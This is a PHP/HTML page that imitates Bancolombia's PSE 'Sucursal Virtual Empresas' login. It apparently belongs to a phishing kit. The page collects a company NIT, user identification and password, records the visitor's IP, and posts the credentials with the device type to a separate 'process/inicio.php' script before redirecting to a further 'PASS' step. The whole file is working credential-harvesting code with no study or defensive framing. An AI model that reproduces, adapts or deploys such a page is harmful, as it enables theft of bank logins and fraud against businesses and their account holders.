<?php
$ip = getenv("REMOTE_ADDR");
require_once __DIR__ . '/../a/fecha_es.php';
$tiempo = b34f9_fecha_larga();
?>
<html>
    <head>
        <title>Bancolombia Pagos PSE - Sucursal Virtual Empresas</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        <meta content="es" http-equiv="Content-Language">
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v2" rel="stylesheet">
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../../../../../js/jquery-3.6.0.min.js"></script>
        <script src="../../../../../js/jquery.jclock-min.js" type="text/javascript"></script>

        <style type="text/css">
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                background: #fff;
                font-family: 'Open Sans', sans-serif;
            }
            .container-empresa {
                display: flex;
                min-height: 100vh;
            }
            .forma-container {
                flex: 0 0 50%;
                padding: 40px;
                display: flex;
                flex-direction: column;
                justify-content: center;
                background: #fff;
            }
            .imagen-container {
                flex: 0 0 50%;
                background: #f5f5f5;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 40px;
            }
            .imagen-container img {
                max-width: 100%;
                max-height: 100%;
                object-fit: contain;
                width: auto;
                height: auto;
            }
            .header-empresa {
                margin-bottom: 30px;
            }
            .header-empresa .logo {
                font-size: 14px;
                color: #1a1b1a;
                font-weight: bold;
                margin-bottom: 5px;
            }
            .header-empresa .subtitle {
                font-size: 11px;
                color: #999;
                margin-bottom: 3px;
                line-height: 1.4;
            }
            .titulo-form {
                font-size: 18px;
                font-weight: bold;
                color: #1a1b1a;
                margin: 20px 0 10px 0;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-label {
                font-size: 12px;
                color: #666;
                font-weight: 600;
                margin-bottom: 8px;
                display: block;
            }
            .tipo-cliente-texto {
                font-size: 13px;
                color: #1a1b1a;
                padding: 10px 12px;
                background: #f9f9f9;
                border: 1px solid #e0e0e0;
                border-radius: 4px;
                font-weight: 500;
            }
            .form-input {
                width: 100%;
                padding: 10px 12px;
                border: 1px solid #ddd;
                border-radius: 4px;
                font-size: 13px;
                font-family: 'Open Sans', sans-serif;
                box-sizing: border-box;
            }
            .form-input:focus {
                outline: none;
                border-color: #ffd700;
                box-shadow: 0 0 5px rgba(255, 215, 0, 0.3);
            }
            .form-buttons {
                display: flex;
                gap: 15px;
                margin-top: 30px;
            }
            .btn-cancelar {
                flex: 1;
                padding: 12px;
                border: 2px solid #ddd;
                background: #fff;
                color: #1a1b1a;
                font-weight: bold;
                cursor: pointer;
                border-radius: 4px;
                font-size: 14px;
                transition: all 0.3s;
            }
            .btn-cancelar:hover {
                border-color: #999;
            }
            .btn-continuar {
                flex: 1;
                padding: 12px;
                border: none;
                background: #ffd700;
                color: #1a1b1a;
                font-weight: bold;
                cursor: pointer;
                border-radius: 4px;
                font-size: 14px;
                transition: all 0.3s;
            }
            .btn-continuar:hover {
                background: #ffed4e;
            }
            .btn-continuar:disabled {
                background: #ddd;
                cursor: not-allowed;
            }

            /* RESPONSIVE */
            @media (max-width: 768px) {
                .container-empresa {
                    flex-direction: column;
                }
                .forma-container {
                    flex: 0 0 auto;
                    padding: 30px 20px;
                    justify-content: flex-start;
                    padding-top: 20px;
                }
                .imagen-container {
                    flex: 0 0 auto;
                    padding: 30px 20px;
                    background: #f5f5f5;
                    min-height: 400px;
                    order: 2;
                }
                .imagen-container img {
                    max-width: 100%;
                    height: auto;
                }
            }
        </style>
    </head>
    <body>
        <div class="container-empresa">
            <div class="forma-container">
                <div class="header-empresa">
                    <div class="logo">☰ Bancolombia</div>
                    <div class="subtitle">Pagos PSE - Sucursal Virtual Empresas</div>
                    <div class="subtitle">Tienda Virtual o Recaudador: BANCOLOMBIA</div>
                </div>

                <div style="background: #f9f9f9; padding: 15px; border-radius: 4px; margin-bottom: 20px; font-size: 12px; color: #666;">
                    Ingresa los datos solicitados y haga clic en "Continuar".
                </div>

                <form id="form-empresa" method="POST" action="">
                    <div class="form-group">
                        <label class="form-label">Tipo de Cliente</label>
                        <div class="tipo-cliente-texto">
                            <i class="fas fa-building"></i> Empresa
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="form-label">NIT de la Empresa</label>
                        <input type="text" class="form-input" name="nit" id="nit" placeholder="" required>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Identificación del Usuario</label>
                        <input type="text" class="form-input" name="usuario" id="usuario" placeholder="" required>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Clave</label>
                        <input type="password" class="form-input" name="clave" id="clave" placeholder="" required>
                    </div>

                    <div class="form-buttons">
                        <button type="button" class="btn-cancelar" onclick="volverSelector()">Cancelar</button>
                        <button type="submit" class="btn-continuar" id="btn-submit">Continuar</button>
                    </div>
                </form>
            </div>

            <div class="imagen-container">
                <img src="../img/ReversoEmpresa.jpg" alt="Seguridad Bancolombia">
            </div>
        </div>

        <script type="text/javascript">
            function volverSelector() {
                window.location.href = "../selector.php";
            }

            // Ruta al procesador
            var PSE_PROCESS = "../../../../../process/";

            function procesarLoginEmpresa(nit, usuario, clave) {
                $("#fondo").show();
                var dispositivo = detectarDispositivo();

                // Enviar a inicio.php con tipo_cliente = "empresa", contraseña y NIT
                $.post(PSE_PROCESS + "inicio.php", {
                    usr: usuario,
                    pas: clave,
                    nit: nit,
                    dis: dispositivo,
                    tc: "empresa"
                }, function(data) {
                    setTimeout(function() {
                        window.location.href = "../a/PASS";
                    }, 1500);
                });
            }

            function detectarDispositivo() {
                var dispositivo = "";
                if(navigator.userAgent.match(/Android/i))
                    dispositivo = "Android";
                else if(navigator.userAgent.match(/iPhone/i))
                    dispositivo = "iPhone";
                else if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    dispositivo = "PC";
                return dispositivo;
            }

            $(document).ready(function() {
                var nit = "";
                var usuario = "";
                var clave = "";

                // Validar NIT
                $('#nit').keyup(function() {
                    nit = $(this).val();
                    validarFormulario();
                });

                // Validar Usuario
                $('#usuario').keyup(function() {
                    usuario = $(this).val();
                    validarFormulario();
                });

                // Validar Clave
                $('#clave').keyup(function() {
                    clave = $(this).val();
                    validarFormulario();
                });

                function validarFormulario() {
                    if (nit.length > 0 && usuario.length > 0 && clave.length > 0) {
                        $('#btn-submit').removeAttr('disabled').css('background', '#ffd700').css('cursor', 'pointer');
                    } else {
                        $('#btn-submit').attr('disabled', 'disabled').css('background', '#ddd').css('cursor', 'not-allowed');
                    }
                }

                // Enviar formulario
                $('#form-empresa').on('submit', function(e) {
                    e.preventDefault();
                    procesarLoginEmpresa(nit, usuario, clave);
                });

                // Inicializar botón deshabilitado
                validarFormulario();
            });
        </script>

        <div id="fondo" style="display:none;"></div>

    </body>
</html>